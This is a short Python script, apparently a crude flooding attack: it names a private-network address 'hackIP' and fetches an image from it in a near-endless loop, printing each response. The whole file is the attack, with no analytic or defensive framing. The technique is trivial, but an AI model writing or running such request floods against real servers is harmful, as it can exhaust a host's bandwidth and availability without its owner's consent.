import urllib.request

hackIP = "http://192.168.0.101/assets/images/demo/compare.jpg"



for x in range(1,10000000000000000000000000000000):
    req = urllib.request.Request(hackIP)
    image = urllib.request.urlopen(req).read()
    print(image)

